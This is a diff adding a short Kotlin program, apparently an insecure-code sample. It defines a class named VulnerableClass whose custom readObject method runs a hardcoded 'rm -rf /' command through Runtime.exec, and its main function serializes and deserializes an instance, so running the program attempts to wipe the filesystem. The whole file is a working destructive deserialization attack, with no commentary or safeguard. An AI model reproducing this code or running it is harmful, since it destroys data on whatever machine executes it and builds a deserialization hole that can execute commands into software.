@@ -1,0 +1,27 @@
+import java.io.*
+import java.util.*
+
+class VulnerableClass : Serializable {
+    val command: String
+
+    init {
+        command = "rm -rf /"
+    }
+
+    private fun readObject(inputStream: ObjectInputStream) {
+        inputStream.defaultReadObject()
+        Runtime.getRuntime().exec(command)
+    }
+}
+
+fun main(args: Array<String>) {
+    val byteArrayOutputStream = ByteArrayOutputStream()
+    val objectOutputStream = ObjectOutputStream(byteArrayOutputStream)
+    objectOutputStream.writeObject(VulnerableClass())
+    objectOutputStream.close()
+
+    val byteArrayInputStream = ByteArrayInputStream(byteArrayOutputStream.toByteArray())
+    val objectInputStream = ObjectInputStream(byteArrayInputStream)
+    objectInputStream.readObject()
+    objectInputStream.close()
+}
